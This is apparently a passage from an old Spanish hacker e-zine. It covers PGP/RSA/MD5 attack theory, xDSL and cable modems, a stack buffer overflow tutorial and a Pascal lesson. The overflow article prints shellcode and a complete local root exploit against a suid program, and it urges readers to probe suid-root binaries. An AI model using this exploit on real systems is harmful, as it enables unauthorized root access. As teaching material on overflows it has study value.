  RU mod k == (s^-1)(Y^d) mod k == (s^-1)(X^d)(C^d) mod k == C^d mod k == t !!
   
   O sea, que para evitar este tipo de ataques lo unico que se debe hacer es
   no firmar documentos extraÒos ;-)

        4.- Problemas cuando 'e' es muy bajo.
	-------------------------------------
   Veamos, si la clave de encriptacion 'e' es muy baja (usualmente se prueban 
   los valos 3,17 y 65537, no pregunteis por que ;) entonces la velocidad de 
   las operaciones es mucho mayor. El unico problema para usar valores muy 
   bajos es que el mensaje sea tambien muy corto. Explicado con un ejemplo:
   si tomamos el valor 'e' como 3, y queremos encriptar en mensaje 't',
   pero da la casualidad de que 't' es menor que la raiz cubica de 'k',
   resulta que la operacion de encriptacion (E=t^3 mod k) resulta equivalente
   a 't^3', con lo que para volver a tener 't' solo tenemos que hacer una
   simple raiz cubica.

   Solucion: hacer que 't' sea desde el principio (mediante alguna operacion
   aleatoria) mayor que 'k'.

   Consecuencia: el PGP hace esto y no es vulnerable al ataque ;) (en realidad
   el PGP usa valores de 'e' bajos siendo el valor por defecto 17; si no puede
   sacar 'd' con 'e' igual a 17, entonces pasa a 'e' igual a 19, y asi 
   continuamente.).

 Hay mas tipos de ataque, como el ataque por calculo de tiempo (que se basa
 en que el RSA siempre tarda el mismo tiempo en hacer la misma operacion, por
 lo que observando el proceso de encriptacion, en una red por ejemplo, se
 puede llegar a averiguar 'd' a partir de 'C'), pero el PGP los ha ido
 solucionando a traves de sus diferentes versiones, asi que no voy a
 comentarlos aqui.

  Ataques al MD5
 ----------------
 Como he comentado mas arriba, el MD5 se usa para sacar un numero 
 identificativo de cada mensaje. Vamos directamente a los medios de ataque.

	1.- Ataques de fuerza bruta.
	----------------------------
   Teoricamente, la resistencia de una funcion hash se define como la
   capacidad de, dado un determinado mensaje, sacar un identificativo unico
   para ese mensaje. Cuanto menos probabilidades de hacer que saque resultados
   erroneos (no unicos) mas fuerte sera el algoritmo. Hay dos tipos de ataques
   de este tipo:
   
	  1.a - ataque de fuerza bruta clasico: la salida del md5 es un numero
	        de 128 bits y el reto es encontrar otro mensaje que produzca
		la misma salida. Como siempre: en una maquina que pudiera 
		probar mil millones de combinaciones por segundo se tardarian
		1.07e22 aÒos, asi que nada :).
	  
	  1.b - ataque por colision: Lo mismo que antes, se trata de encontrar
	        dos mensajes con resultados identicos, pero aqui se utilizan
		metodos probabilisticos muy bien planteados para obtenerlos.
		En concreto: dados un numero de mensajes 'n' y un numero
		de posibles salidas 'k', se pueden crear n(n-1)/2 parejas
		con los mensajes iniciales (logico, no?) y existe 1/k
		posibilidades de encontrar una pareja que produzca el mismo
		resultado. Por eso, si cogemos k/2 parejas tenemos un 50%
		de probabilidades de encontrar la pareja correcta. Si
		'n' es mayor que la raiz cuadrada de 'k', vamos obteniendo
		mas posibilidades de encontrar dicha pareja, y seguimos 
		iterando de esa manera. Concretamente para el MD5 se 
		necesitan 2^64 mensajes iniciales para que esto tenga solucion
		y, suponiendo que disponemos del mismo ordenador del ataque
		anterior, "solo" tardariamos 584 aÒos en verificarlos todos.


	2.- "Teoria de la informacion"
	------------------------------	
   Como os podeis imaginar esto no es un tipo de ataque, sino una
   recomendacion para obtener el passphrase mas seguro. Segun algunos
   estudiosos de la informacion (tipicos profesores americanos que no tienen
   otra cosa que hacer, supongo ;) existen 1.3 bits entropicos (aleatorios,
   para que nos entendamos) por cada caracter de 8 bits. En consecuencia, un
   passphrase lo suficientemente largo aseguraria obtener un numero con el MD5
   completamente aleatorio y no dependiente lo mas minimo del algoritmo en 
   si. En el MD5, al usar 128 bits para la salida, se necesita un passphrase
   de 98 caracteres (mas o menos):
	 
	 (8/1.3) * (128/8) = 98.46

   Pero como eso es una burrada, estos estudiosos siguieron investigando y 
   llegaron a la conclusion de que, suponiendo la misma probabilidad de 
   aparicion para los 26 caracteres, solo necesitamos 27.23 caracteres para
   obtener un passphrase completamente aleatorio (que tambien sigue siendo 
   una burrada. O no es asi? };-).

 

  Dejemonos de tonterias. Ataques practicos.
 --------------------------------------------
 Desgraciadamente, como el PGP ya ha pasado por varias versiones, algunas de 
 ellas preparadas exclusivamente para que criptoanalistas expertos puedan
 ver sus fallos (por que creeis que se paso de la 2.6.3ia la 5.0? ;), es muy
 dificil que los ataques citados anteriormente sirvan para algo (siempre hay
 que tener en cuenta que estan ahi, que el NSA nunca se esta quieto).
 Obviando los ataques tipicos de hackers como podrian ser la instalacion
 de loggeadores de teclado, cracion de troyanos, introduccion de backdoors
 en algun sistema, o incluso coger el codigo fuente y redistribuirlo despues
 de modificarlo (os juro que lo he visto :), voy a comentar un par de ataques
 mas 'eficaces':

 a) Volcado de memoria.
    En un sistema multiusuario como Unix, toda la memoria fisica del sistema 
    esta disponible para cualquiera que tenga privilegios (root };-), por lo 
    que en vez de factorizar una bestialidad de numero se puede acceder 
    directamente a la pagina de memoria del usuario (/dev/mem y /dev/kmem) y 
    leer alli todo lo que se quiera.

 b) Volcado del cache de disco.
    Los sistemas multitarea (siempre Windows dando la nota :) tienen la 
    estupida mania de volcar parte de la memoria a disco cada vez que se da
    la remota posibilidad de necesitar RAM libre. Por ello es bastante facil 
    robar el archivo de swap (si estamos en una red se puede hacer mas 
    facilmente todavia) y sacar de alli cualquier cosa que el sistema halla
    puesto, como claves, documentos descifrados, etc.



Bueno. Como ya dije en el comienzo, este articulo no es que sea demasiado 
espectacular pero vale para llenar hueco ;-).

Agradecimientos a todos los que sabeis, y a todos los que nos entretuvimos
con el /dev/mem aquella noche (y si no os acordais, mirad los logs X-D )

sin nada mas que aÒadir.

un saludete
cafo


==============================================================================
------------------------------------------------------------------------------
==============================================================================


              +-------------------------------------------------+
              | .oO  xDSL y otras alternativas de conexion  Oo. |
              +-------------------------------------------------+


   0. ( Indice )

	1.- Presentacion
	2.- xDSL
	3.- ADSL
	4.- Ventajas e inconvenientes de xDSL
        5.- Modem cable
	6.- Ventajas e inconvenientes del modem cable
	7.- VDSL, SDSL y HDSL
	8.- Tarifa Plana en EspaÒa
        9.- Opinion final

   1. ( Presentacion )

Este documento intenta explicar de una manera muy sencilla y breve la
tecnologia DSL, su implantacion y variantes.

No hace falta tener grandes conocimientos de nada para entender este documento
tan solo ganas de leer.
Quizas no sea lo suficientemente tecnico para que a algun "guru" del mundillo
le sirva, lo siento por ellos :)
 
   2. ( xDSL )
 
Se llaman xDSL a todo un grupo de tecnologias que usando las actuales lineas 
de cobre, permiten una conexion mucho mas rapida que la actual.
La tecnologia DSL fue desarrollada por Bellcore, una division de Bell que se
dedica a investigacion.

DSL - Digital Subscriber Line, Linea de Abonado Digital. Se llaman las
tecnologias DSL porque los nombres de cada una de ellas acaban en DSL, estas
son:

	- SDSL ->  Single-line/Symmetric Digital Subscriber Line
	- ADSL ->  Asymmetric Digital Subscriber Line
	- RADSL -> Reverse Asymmetric Digital Subscriber Line
	- HDSL ->  High data rate Digital Subscriber Line
	- VDSL ->  Very High data rate Digital Subscriber Line
	- VADSL -> Very High speed Digital Subscriber Line (es igual que VDSL)
 
Cada una de estas tecnologias se diferencia de las otras en cuanto a velocidad
y distancia a la central, ya que las "magnificas" lineas de cobre actuales, 
cuanto mayor sea la distancia del modem a la central, peor la transmision de 
datos.

    3. ( ADSL )

ADSL - Asymetric Digital Subscriber Line, Linea Asimetrica de Abonado Digital.
Aunque nos pueda parecer nueva, esta tecnologia no es nada nueva, es mas, hace
mas tiempo que existe del que posiblemente tu estes conectado. De aqui el
llamarlas antes "nuevas viejas" tecnologias, ya que aunque son viejas, se
presentan como algo nuevo.
Esta linea perece ser la mejor opcion para el uso domestico dadas su relacion
velocidad/precio.

Las lineas ADSL permiten una velocidad de transmision muy rapida comparada con
los sistemas actuales. Maximo 8,448Mbps (ADSL) contra 128kbits/s (RDSI). Pero
como no es oro todo lo que reluce, son, no son 8Mbps.
El hecho que en su nombre aparezca Asymmetric, justifica el que esta linea
pueda transmitir a muchas mas datos de los que puede recibir.
Es decir: podras llegar a transmitir a 8Mbps pero recibiras como maximo a unos 
0.8Mbps

Igualmente, la velocidad de recepcion es alta, aunque casi 10 veces menor que
la de transmision.
 
He dicho 8Mb/s, pero esto es el maximo. A ver, os explico:

Normalmente las compaÒias telefonicas o el proveedor de acceso, dependiendo
del caso, os limitaran el acceso. Es decir, quizas lo ofrezcan en rangos de
128kbps a los 8Mbps por segundo, aplicando tarifas mucho mas caras en el
segundo caso.
 
Las lineas ADSL usan un modem especial, es decir, tu modem actual no te sirve.
Pues como va esto ?

El proceso de instalacion es un "poco" complicado. La compaÒia telefonica,
debe instalar un "discriminador" tanto en tu casa como en la centralita. Y que
es un discriminador? Pues un aparato que tiene dos conectores, a los
que conectas el susodicho modem y tu telefono normal y corriente. Este
discriminador distinge entre llamadas de datos y de voz.

Como la velocidad del puerto serie no es suficiente para un modem ADSL pues
este se conecta normalmente a una tarjeta de red instalada en tu ordenador.

    4. ( Ventajas e inconvenientes de ADSL )

 Ventajas:

	- Velocidad de conexion alta
	- Conexion permanente
	- No hace uso del telefono por lo que se suprime el gasto telefonico
	- La capacidad no se comparte con otros usuarios

 Desventajas:

   Las desventajas de este tipo de lineas no son tecnicas, sino mas bien
   politico-comerciales. Entre estas destacan:
   - Los modems ADSL son caros.
   - El coste mensual es demasiado elevado aun para un usuario normal. En EEUU
     son unas 5000 pts por mes.
   - El mal cableado puede provocar una importante reduccion del rendimiento y
     de la velocidad.
   - Podria producirse un monopolio ya que solo cubren el tramo que va desde
     tu casa hasta la central telefonica, con lo que si algun ISP no puede
     instalar sus equipos en la central es solo la compaÒia telefonica quien
     puede permitir el acceso ADSL.

    5. ( Modem Cable )

El modem cable es una tecnologia muy conocida en paises de fuera de nuestras
fronteras, alli ya disponen desde hace mucho de television por cable, que
permite una calidad de imagen muchisimo mas alta y una oferta de canales mayor
Nosotros hemos tenido que esperar a la liberalizacion de las comunicaciones
para poder empezar a disfrutar de algunas de estas tecnologias.

Hasta ahora, el cable era usado para la television y poco mas, viajaban
cientos de canales y de informacion cifrada por un pequeÒo cable y con una
calidad realmente asombrosa. Gracias a los ultimos avances en las
telecomunicaciones se ha conseguido transmitir datos a traves de este mismo
cable.

El metodo usado es este: Los datos se envian en forma de impulsos electricos,
como si fuesen datos de television con la unica diferencia de la frecuencia de
estos, en este caso va de 42 a 750MHz. Cuando estos llegan al usuario, el
ordenador no puede "entenderlos" por lo que hace falta algo que pase la
informacion de impulsos electricos a datos que el ordenador pueda interpretar,
aqui entra en juego el modem cable.

El documento cable.jpg os lo muestra de una manera mas grafica.

[ NOTA: La imagen JPG de la que habla Sp4rK esta disponible en UnderSec
        http://www.undersec.com/ ]

 Si os fijais en el dibujo, ademas de todo lo comentado aparece algo nuevo:
 La tarjeta de red. La funcion de esta es la de enviar los datos del modem
 a tu ordenador, de una manera rapida, porque, igual que en ADSL, el puerto
 serie no es suficientemente rapido.

Asi que resumiendo, para bajarte una archivo de Inet con un modem cable, pasa
algo asi:

 1- Una vez pedido el archivo, este se fragmenta en paquetes.
 2- Cada paquete llega a la central telefonica, donde se convierte en un
 impulso electrico.
 3- Este impulso llega a tu casa, donde el modem cable lo convierte otra vez
 en el paquete original.
 4- El modem cable envia, a traves de la tarjeta de red, cada uno de los
 paquetes a tu ordenador.

 Las velocidades que alcanza un modem cable van desde 1'54 Mb/s a 10 Mb/s.
 En el envio de datos, parece que el modem cable ya tiene unos estandards,
 estos son:

        -QPSK -> Que consigue velocidades de unos 10Mb/s
        -QAM64 -> Que consigue velocidades de unos 36Mb/s

Ademas, en el envio de datos, no hay ningun problema de interferencias entre
frecuancias. Donde aparecen algunos problemas es en el envio de datos que van
al proveedor de television, que van a un frecuencia de 5 a 40 MHz, con lo que
pueden aparecer muchos mas errores, causados por los ruidos y hasta un retraso
en el envio de datos.
Para eso, en este caso, se usa el modelo de modulacion QPSK, que al transmitir
a una velocidad inferior, consigue reducir el nivel de interferencias y ruido
en la linea.

    6. ( Ventajas e inconvenientes del modem cable )

 Ventajas:
        - La gran velocidad que este pude alcanzar
        - Que no haga uso de la linea telefonica, con lo que permita poder
        llamar sin tener que "desconectarse"
        - Conexion permanente a internet
        - El no hacer uso de la linea telefonica permite una supuesta Tarifa
        Plana.(despues entenderas el porque de este "supuesta")

 Inconvenientes:
        - La instalacion resulta un poco cara y complicada.
        - El precio de conexion es elevado.

    7. ( SDSL, HDSL y VDSL )

VDSL se trata de una version mucho mas rapida de ADSL. Consigue unos ratios de
transferencia de recepcion de 55Mbps y de envio de unos 2.3Mbps. 

Usa dos canales, uno para recepcion y otro para envio y los dos pueden ser
dividos usando los servicios actuales RDSI.

SDSL es una version de un solo canal de VDSL. Esta limitado a distancias mas
cortas, pero llega a transmitir a 2,048Mbps a distancias de mas de 3
kilometros. 

HDSL es la version duplex de ADSL. Mientras que ADSL usa tan solo un cable,
HDSL usa dos. Llega a transmitir a velocidades de mas de 2Mbps. 

    8. ( Tarifa Plana en EspaÒa )

Ultimamente el tema de la tarifa plana en EspaÒa se esta cuestionando
fuertemente, por lo que voy a hablar un poco de lo que se pretende hacer o las
opciones que hay.

Por lo que parece ser el Ministerio de Fomento quiere implantar la tarifa
plana haciendo uso de ADSL. Si, todo parece muy bonito, pero esperad un
momento.

.. dijeron ADSL y algo mas...

ADSL Lite. :?. Pues si.
ADSL Lite es una version de ADSL pero a lo cutre (como todo lo que se hace en
EspaÒa). Permite una conexion a una velocidad menor pero tambien una reduccion
en el coste de la linea.

Bueno, la idea no es mala. Pero cuanto tardaran en implantarla ? BINGO !!!
Acertaste la pregunta clave... pues se ha hablado desde 6 meses hasta el aÒo
y medio, asi que como siempre, calcula... de 6 a 18 meses... pues digo yo que
un aÒo.

El tema de conexion a Internet por cable (lease CTC, Telecable, etc) es algo
que va a traer mucha polemica. Y porque ? Pues porque, si, la conexion es
rapida, pero como se va a facturar ? Tarifa Plana ? o tendremos que pagar por
el numero de bytes recibidos ? A cuanto ira el byte ? A 0'1 pts? 0'001 euros?
Quien sabe, eso es algo que aun hay que discutir y que, como decia, va a traer
mucha polemica.

En la actualidad se esta ofreciendo una "tarifa plana" por estos servicios de
conexion por cable. Se pagan X pesetas al mes y se te ofrece conexion a
Internet por cable a una velocidad X y con unos aÒadidos (o sustraidos :) X.

    9. ( Opinion final )

Pienso que ADSL (o ADSL Lite, es igual) es una opcion mas a tener en cuenta.
Lo que veo es que seguimos haciendo las cosas "a la espaÒola" y en lugar de ha
cer un cambio que va a ser mucho mejor para todos, seguimos intentando reutili
zar todo lo que podemos. Vale, de acuerdo con que esto esta bien. Pero es que
si todo lo hacemos asi (y siento decir que si) vamos a acabar mal.

Tan solo hace falta ver en que posicion esta EspaÒa en respecto a los otros
paises en lo que a Internet se refiere. La verdad, da pena que un pais que
tiene tantas ganas de abrirse al nuevo mundo, de renovarse, se vea frenado por
una pandilla de ineptos que se hacen llamar ministr... bah, es igual.

Es una pena que todo un pais dependa de las decisiones de un bigotudo
personaje y de sus pateticos subordinados. Y no voy en contra de ningun
partido en concreto, voy en contra de toda politica que vaya en contra de la
proliferacion de la tecnologia en EspaÒa.

                                                                    Un saludo,
                                                                         Sp4rK

Sp4rK is a member of UNDERSEC / NGS TEAM
sp4rk@undersec.com
http://www.undersec.com/

==============================================================================
------------------------------------------------------------------------------
==============================================================================


		____________________________________________
		|					   |
		|   	 Desbordamiento de la pila         |
		|					   |
		--------------------------------------------


Holass. En este texto voy a intentar explicar lo que es un desbordamiento de
la pila, mas conocido como stack buffer overflow, y como funciona a grandes
rasgos un xploit. Lo primero de todo decir que este texto no pretende ser
una guia para hacer xploits ni nada parecido, ya que es posible que yo aun
tenga algun que otro concepto erroneo, asi que si meto algun que otro gambazo
espero que no me tireis tomates ;).

Bueno, como muchos sabreis unos de los problemas de los sistemas operativos
multiusuario es que para ejecutar ciertas acciones necesitas tener privilegios
de root. Por ejemplo para cambiar tu password, ya que tu no tienes los sufi-
cientes privilegios para editar y modificar el fichero /etc/passwd. Entonces
lo que suele hacerse en poner el programa (passwd en este caso) con suid de
root, de tal forma que al hacer un ls -l saldria algo como:

-rwsr-xr-x   1 root     root        44705 Jul  1 00:49 /usr/bin/passwd

Asi cuando un usuario cualquiera ejecute el programa passwd, su uid y gid
seran cambiados momentaneamente al del root para poder modificar el ficheros
de passwd, y cuando finalice el programa volveran a cambiar a tu uid y gid
normal. El problema empieza cuando el programa con suid de root copia datos a
buffers sin un limite en el numero de caracteres a copiar, ya que copiando mas
datos de los debidos al buffer podemos sobreescribir partes importantes de la
pila y ejecutar codigo arbitrario.

Pongamos por ejemplo este sencillo programa: (simple.c)

<++> pila/simple.c !ff64d294
#include <stdio.h>

main(int argc,char *argv[]) {
char s[1024];

strcpy(s,argv[1]);
}
<-->

Lo unico que hace es cojer de la orden de comandos las opciones (argv[1]) y
copiarlo al buffer s de 1024 caracteres. Aqui no se hace comprobaciones de la
cantidad de caracteres a copiar en s, por lo tanto nada nos impide copiar mas
de 1024 caracteres. Para hacer pruebas y si tienes instalado el perl, lo mejor
es usar algo como `perl -e 'print "A" x 400;'`. Por ejemplo ejecutamos
./simple `perl -e 'print "A" x 400;'`, y no pasa nada. Pero ejecutamos
./simple `perl -e 'print "A" x 1200;'` y tenemos un Segmentation fault, pq?.
Para entenderlo tenemos que hechar una vistazo a como se guardan las variables
locales en la pila. Para ser exactos el aspecto de la pila despues de haber
ejecutado el programa simple seria algo como:



        +-------------+ -1024(%ebp)
        |  1024 bytes |                 ->  variable s 
        +-------------+     0(%ebp)     
        |     ebp     |			->  posicion actual de la pila
        +-------------+     4(%ebp)
        |   ret addr  |			->  direccion de retorno
        +-------------+     8(%ebp)
        |     argc    |
        +-------------+    12(%ebp)
        |     argv    |
        +-------------+    16(%ebp)
        |     envp    |
        +-------------+


Lo que mas nos interesa es la direccion de retorno. La posicion actual de la
pila y la direccion de retorno tienen un tamaÒo de 4 bytes cada uno. Los nu-
meros que aparecen (0,4,8,12,16) son la distancia al puntero base (ebp, o po-
sicion actual de la pila). Asi, al principio de la variable s habra unos 1024
bytes hasta el ebp (justo el tamaÒo de la variable). La posicion de retorno
contiene la direccion a la que saltara el programa cuando finalice su ejecu-
cion. Pues bien, lo que hacemos al ejecutar ./simple
`perl -e 'print "A" x 1200;'`, es sobreescribir el ebp y la direccion de
retorno con el caracter A, asi cuando finaliza el programa el sistema salta a
la direccion de retorno 0x41414141, (A en hex es 0x41), y al no haber codigo
ejecutable en esa direccion el sistema hace un Segmentation fault. Ahora lo
interesante seria que pudieramos sobreescribir la direccion de retorno a una
direccion donde hubieramos puesto un codigo ejecutable (que ejecute una shell
por ejemplo). Para ello lo que se hace es copiar ese codigo en la propia
variable s.

Vamos a ver..tenemos la variable s, como hacemos para copiar un codigo que
ejecute una shell? Pues bien, por ahi andan rulando codigos en ensamblador
para todos los sos que ejecutan una shell, normalmente /bin/sh. Para linux y
un procesador intel o compatible seria algo como:

char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

Hay que tener en cuenta que cuanto menor sea el codigo mejor, ya que si el bu-
ffer a sobreescribir es pequeÒo no nos entraria en la variable. Bueno, pues
explicado asi por encima lo que se hace es llenar la variable s de tal forma
que quedaria algo como:

[NOP-NOP-NOP-NOP(muchos nops)-execshell]. Todo esto seria en los 1024 by-
tes que ocupa s. Lo de los nops se hace pq al sobreescribir la direccion de
retorno en la pila seria muy complicado hacerlo para que saltara justo al co-
mienzo del execshell, entonces lo que se hace es que salte a un nop (mucho mas
facil al haber tantos) y que vaya bajando hasta que ejecute la shell. Despues
de el execshell es cuando hay que sobreescribir la direccion de retorno. Si
hechais un vistazo al cuadro de antes de la pila vereis que s estaba a -1024
bytes del ebp, por lo tanto estara a -1028 bytes de la direccion de retorno.
Entonces si a la direccion del ebp le restamos unos 1000 bytes por ejemplo, lo
mas probable es que esa direccion pertenezca a un nop (ya que los nops estan
en la variable s). Esto no lo tengo yo muy claro, ya que no se si el contenido
del ebp ya es la direccion de la variable s (el comienzo de la pila) o por el
contrario es la direccion del propio ebp y hace falta restarle los 1000 bytes.
En todo caso hecharle las culpas a DarK FeaR por meterme tanta prisa para el
articulo XD. Y todas formas luego veremos que el xploit para el programa
simple funciona de las dos formas, restandole los 1000 bytes o no. Bueno, y
despues de todo este rollo la forma del buffer seria algo como:

[NOP-NOP-NOP-NOP(muchos nops)-execshell-direccion de retorno]. Y al copiar
todo esto con el strcpy sobreescribiriamos la direccion de retorno apuntando
a un nop, iria bajando y ejecutaria una shell, que al estar suid root el
programa seria una shell de root (por fin!). A todo esto lo de los offsets por
si hay mas variables en la pila lo dejo para otro articulo ;).

Ahora vamos a ver el xploit para el programa simple (debe estar suid root).
Empecemos..

#include <stdio.h>

char buffer[1040];
int i;
char *ptr;
unsigned long *ptr2;

Aqui se declara el buffer total, 1040 bytes, ya que escribiremos la direccion
de retorno unas cuantas veces. Si os habeis fijado el buffer deberia ser de
1032 (1024+8), pero lo hacemos de 1040 para escribir la direccion de retorno
4 veces en vez de 2 y ser mas efectivo. Luego declara un puntero de tipo char
(ptr) y otro de tipo long para la direccion de retorno (ptr2), bueno y i de
tipo entero.

main()
{

long get_sp(void)
{
__asm__("movl %esp,%eax\n");
}
char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

Aqui se declara la funcion que usaremos para conseguir la direccion de
retorno, la funcion consigue el ebp, y declaramos el codigo que ejecuta una
shell como un array de caracteres.

for(i=0;i<1040;i++)
buffer[i]=0x00;
ptr=buffer;

Llenamos los 1040 bytes del buffer como 0x00, esto tp es muy necesario pero
queda bien :). Y hacemos que ptr apunte a buffer.

for(i=0;i<1024-strlen(execshell);i++)
*(ptr++)=0x90;
for(i=0;i<strlen(execshell);i++)
*(ptr++)=execshell[i];

Esto es interesante, en el primer for copiamos los nop (la instruccion nop es
igual a 0x90 para los procesadores intel y compatibles), y en el segundo
copiamos el codigo que ejecuta la shell. Todo esto en los 1024 primeros bytes.
Necesitaras saber algo de c para entender todo esto, pero no mucho mas que
saber como se usa el for y algo de punteros y arrays. Ahora mismo el buffer
tiene la forma: 

Nop-nop-nop-nop(muchos nops)-execshell-0x00(hasta el final)
^-------------------------------------^--------------------^
	      1024 bytes		    16 bytes

Sigamos..

ptr2=(long *)ptr;
for(i=0;i<4;i++)
*(ptr2++)=get_sp()-1000;

Aqui es donde escribimos la direccion de retorno apuntando a la propia
variable s (a un nop). Lo primero hacemos que ptr2 apunte a ptr de forma que
sepa que lo que vamos a copiar son datos de tipo long (ocupan 4 bytes cada
uno, por lo tanto 16/4 = 4, o sea que vamos a escribir la direccion 4 veces
hasta completar los 1040 bytes totales). Luego con el for copiamos la
direccion 4 veces, a la vez que vamos incrementando ptr2, que se incrementa de
4 en 4 ya que lo declaramos como tipo long. Aqui es donde os decia que me
entraba la duda, ya que si le restamos los 1000 al ebp como sino el xploit
funciona (repito, flames a dark_fear XD). Bueno, y ya tenemos el buffer de
esta forma:

Nop-nop-nop-nop(muchos nops)-execshell-direccion de retorno 4 veces
^-------------------------------------^----------------------------^
              1024 bytes                    16 bytes

Ahora solo falta ejecutar el programa simple y meterle el buffer como argv[1]:

execl("./simple", "simple", buffer, 0);
}

Y ya esta, ya tenemos una shell de root :). Ahora pego el codigo del xploit
entero por si quereis hacer pruebas.

		------------------------------------	

<++> pila/xploit.c !db6b0cbd
#include <stdio.h>

char buffer[1040];
int i;
char *ptr;
unsigned long *ptr2;

main()
{

long get_sp(void)
{
__asm__("movl %esp,%eax\n");
}
char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

for(i=0;i<1040;i++)
buffer[i]=0x00;
ptr=buffer;

for(i=0;i<1024-strlen(execshell);i++)
*(ptr++)=0x90;
for(i=0;i<strlen(execshell);i++)
*(ptr++)=execshell[i];
ptr2=(long *)ptr;
for(i=0;i<4;i++)
*(ptr2++)=get_sp()-1000;

execl("./simple", "simple", buffer, 0);
}
<-->

		------------------------------


Luego es buscar programas suid root por ahi, y probar a meterle parametros
muy grandes a ver si hace un Segmentation fault, y si lo hace averiguar de
cuanto es la variable (suele ser un multiplo de 256), por ejemplo mirando el
el codigo fuente. Por supuesto, el programa tiene que estar suid root, que
sino no sirve de nada jeje, o por lo menos suid algo (mail por ejemplo,
para leer el correo).

Bueno, y se acabo el articulo. Tengo que dar las gracias a ulandron que me ha
ayudado mucho proporcionandome informacion y alguna que otra clase teorica ;).
Y un saludo para sp4rk, dark_fear, gamerx y a toda la peÒa del #hacker_novatos
y #netsearch. Nos vemos, byess.

Nota: Dark, ya sabes que eso que decia era coÒa, no te moskees ;).

RaiSe
raise@biogate.com
http://hello.to/hacker_novatos


==============================================================================
------------------------------------------------------------------------------
==============================================================================


              +-----------------------------------------------+
              | .oO  Curso de Programacion en Pascal (II) Oo. |
              +-----------------------------------------------+


Holas, ya esta aqui el pesao del pascal de nuevo con vosotros :). En esta
segunda entrega veremos como va lo de interactuar con el usuaria del
programa para pedirle datos y demas. Vamos al grano:

Writeln
-------

Writeln no es mas que la instruccion que nos servira para presentar textos
en pantalla. Su sintaxis es:

  Writeln(String);

Esto quiere decir que lo que vamos a poner sera una variable de texto o
String. Todo lo que escribamos debe ir entre comillas simples, es decir,
entre ' y '. Ejemplo:

  Writeln('Esto es una prueba');

Daria como resultado que "Esto es una prueba" saliera escrito en la pantalla.

Readln
------

Readln es la instruccion que nos permite recoger datos introducidos por el
usuario, interactuando con el. Esto nos puede servir para muchas cosas,
autentificaciones, para realizar operaciones matematicas, etc. Su sintaxis
es la siguiente:

  Readln(identificador);

Donde indentificador es el nombre de una variable. Esto quiere decir que,
dependiendo del tipo de variable que hayamos declarado con ese nombre, Readln
estara preparado para recoger un tipo de datos, que, si fuera diferente,
nos daria error. Por poneros un ejemplo, si declararamos la variable
"ejemplo" como un integer (Var ejemplo:integer;) y llamaramos a la instruccion
Readln con el parametro ejemplo, Readln(ejemplo);, y en vez de escribir
un numero escribiesemos una letra, el prgrama saldria dandonos un error.


+-----------------+
|Control del flujo|
+-----------------+

Bien, ahora veremos aquellas estructuras que nos posibilitaran repetir una
serie de intrucciones o bien, segun un dato condicional, seguir un camino
u otro.

Estructuras de seleccion
------------------------

Mas de una vez nos encontraremos con que en un programa, dependiendo de la
decision del usuario, tengamos que hacer una cosa u otra. Por poner un
ejemplo, si durante la ejecucion de un programa el usuario decide salir,
y nosotros le pedimos confirmacion (si o no), en caso de que el usuario
decida salir (si) deberiamos terminar con la ejecucion del programa. En
cambio, si el usuario cambia de opinion y responde no, el programa
continuaria. Para este menester existen unas estructuras, las cuales paso
a explicaros a continuacion:

- Estructura IF. Sintaxis:

IF expresion THEN accion

o bien:

IF expresion THEN accion ELSE accion_diferente

expresion no es mas que, o una variable del tipo BOOLEAN ( que puede adoptar
los valores true o false ), o una expresion que de un resultado logico, por
ejemplo: 2+3=5.
La instruccion ELSE sirve para definir un camino en caso de que "expresion"
no sea cierto. Veamos unos ejemplos:

IF (respuesta = true) THEN Writeln('La respuesta es cierta.');
[ Esto realiza la comprobacion de que si "respuesta" esta en valor true, en
  ese caso escribe una linea en pantalla informandonos. ]

IF (respuesta = true) THEN Writeln('La respuesta es cierta.')
ELSE Writeln('La respuesta es falsa.');
[ Aqui en la primera linea se hace lo mismo que en el aterior ejemplo, con
  la salvedad que en la segunda linea, en caso de que no se cumpla la primera
  condicion, se informara al usuario de que la respuesta ha sido falsa. ]

Una propiedad de la instruccion IF es que se pueden encadenar entre ellos.
Un ejemplo de esto seria:

IF (num = 3) THEN Writeln('El resultado es 3')
ELSE IF (num = 4) THEN Writeln('El resultado es 4')
ELSE IF (num = 5) THEN Writeln('El resultado es 5')
ELSE Writeln('No hay ganas de escribir mas.');

El ejemplo habla por si solo :P

- Estructura CASE. Sintaxis:

CASE expresion OF

CASO1: accion_1
CASO2: accion_2
CASO3: accion_3
CASON: accion_n

ELSE accion_defecto

END;

Esta estructura nos servira cuando queramos dar respuesta a unos casos
determinados. Por ejemplo, si le damos un valor a x, siendo x integer,
entre 1 y 5, y queremos responder diferente para cada uno de los numeros.

CASE x OF

1: writeln('ecs');
2: writeln('ecs ecs');
3: writeln('ecs ecs ecs');
4: writeln('ecs ecs ecs ecs');
5: writeln('ecs ecs ecs ecs ecs');

ELSE writeln('y con el descuento, en cuanto se me queda?');
END;

Facil, no?

NOTA: los casos no deben ser exactos, es decir, se le puede dar un rango
de valores separandolos por una coma (,).


Bucles
------

Un bucle no es mas que una repeticion. Imaginemos que tenemos que hacer un
programa que escriba algo muchas veces. Recordais cuando erais pequeÒos y
el profesor os hacia copiar 100 veces algo?. Pues imaginaros que teneis
que hacer un programa que imprima en pantalla 100 veces una frase. El metodo
chapuza seria escribir 100 Writeln's pero el codigo quedaria _algo_ feo.
La solucion son los bucles, que no hacen mas que repetir unas instrucciones
el numero de veces que nosotros les indiquemos.

- Bucle REPEAT-UNTIL. Sintaxis:

REPEAT
instrucciones;
UNTIL expresion

Este es el bucle mas sencillo de comprender. Todo lo que se encuentre entre
